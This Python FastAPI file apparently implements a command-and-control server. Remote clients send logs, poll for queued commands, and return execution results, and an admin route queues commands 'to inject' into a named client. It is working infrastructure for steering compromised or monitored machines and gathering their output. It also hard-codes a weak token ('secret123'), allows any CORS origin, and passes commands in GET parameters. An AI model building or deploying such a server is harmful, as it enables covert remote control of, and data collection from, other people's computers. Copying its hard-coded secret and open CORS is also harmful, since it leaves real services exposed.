from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import json
from datetime import datetime

app = FastAPI()

# Allow your HTML dashboard to connect (if you add one later)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- Your simple in-memory data ---
logs = []
pending_commands = {}
clients = {}
API_TOKEN = "secret123"

# --- ROUTE 1: Receive logs ---
@app.post("/log")
async def receive_log(request: Request):
    header = request.headers.get("Authorization")
    Token = header.split(" ", 1)[1] if header and header.startswith("Bearer ") else None
    if Token != API_TOKEN:
        return {"status": "error", "message": "Unauthorized"}
    
    data = await request.json()
    client_id = data.get("id")
    log_message = data.get("log")
    if client_id and log_message:
        logs.append({"id": client_id, "log": log_message})
        clients[client_id] = {"last_seen": datetime.now()}  # You can use datetime.now() for actual timestamp
        return {"status": "ok"}
    else:
        return {"status": "error", "message": "Missing id or log"}

# --- ROUTE 2: Poll for commands ---
@app.get("/poll/{client_id}")
async def poll(client_id: str, request: Request):
    header = request.headers.get("Authorization")
    Token = header.split(" ", 1)[1] if header and header.startswith("Bearer ") else None
    if Token != API_TOKEN:
        return {"status": "error", "message": "Unauthorized"}
    
    if client_id in pending_commands and pending_commands[client_id]:
        command = pending_commands[client_id].pop(0)
    else:
        command = None
    
    return {"command": command}

# --- ROUTE 3: Receive command result ---
@app.post("/result")
async def receive_result(request: Request):
    header = request.headers.get("Authorization")
    Token = header.split(" ", 1)[1] if header and header.startswith("Bearer ") else None
    if Token != API_TOKEN:
        return {"status": "error", "message": "Unauthorized"}
    
    data = await request.json()
    client_id = data.get("id")
    result = data.get("result")
    if client_id and result:
        print(f"[RESULT]: {result} from {client_id}")
        return {"status": "ok"}
    else:
        return {"status": "error", "message": "Missing id or result"}

# --- ROUTE 4: Add commands to inject ---
@app.get("/admin/add")
async def add_command(client_id: str, command: str, request: Request):
    header = request.headers.get("Authorization")
    Token = header.split(" ", 1)[1] if header and header.startswith("Bearer ") else None
    if Token != API_TOKEN:
        return {"status": "error", "message": "Unauthorized"}
    
    if client_id not in pending_commands:
        pending_commands[client_id] = []
    pending_commands[client_id].append(command)
    return {"status": "ok", "message": f"Command added for {client_id}"}
